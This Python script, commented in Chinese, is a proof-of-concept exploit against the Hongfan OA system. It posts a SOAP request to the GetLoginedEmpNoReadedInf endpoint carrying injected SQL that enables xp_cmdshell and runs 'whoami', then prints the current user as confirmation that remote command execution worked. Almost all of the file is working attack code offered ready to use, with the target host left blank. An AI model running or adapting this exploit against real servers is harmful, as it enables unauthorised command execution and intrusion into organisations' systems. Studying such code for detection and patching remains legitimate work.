#!/usr/bin/env
# -*- coding: utf-8 -*-
#红帆OA GetLoginedEmpNoReadedInf SQL注入 验证RCE whoami
from urllib import request
from io import BytesIO
import gzip
import ssl
import re

ssl._create_default_https_context = ssl._create_unverified_context

host="http://*.*.*.*"
payload1='/iOffice/prg/set/wss/ioAssistance.asmx'
url=host+payload1
flag = 'xp_cmdshell'
payload2='''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetLoginedEmpNoReadedInf xmlns="http://tempuri.org/">
      <sql>
           exec sp_configure 'show advanced options',1;      
           reconfigure;                                      
           exec sp_configure 'xp_cmdshell',1;                
           reconfigure;                                     
           exec sp_configure;
           exec xp_cmdshell 'whoami';
      </sql>
    </GetLoginedEmpNoReadedInf>
  </soap:Body>
</soap:Envelope>'''
header = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
          'Content-Type': "text/xml;charset=utf-8",
          'Accept-Language':"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
          'Accept-Encoding': "gzip, deflate",
          'Cookie': "ASP.NET_SessionId=q20tyaflwrjgpfinowfl5n45",
          'SOAPAction':"http://tempuri.org/GetLoginedEmpNoReadedInf"}

try:
    req = request.Request(url, headers=header, data=payload2.encode(), method='POST')
    response = request.urlopen(req, timeout=2)
    req_content = response.read()
    buff = BytesIO(req_content)
    f = gzip.GzipFile(fileobj=buff)
    req_content = f.read().decode('utf-8')
    if flag in req_content:
        version = re.search(r'<output>(.*)</output>', req_content, re.S).group(1)
        print(url+" 命令执行成功,当前用户为："+version)
except Exception as e:
  print(host + "网站异常"+e)
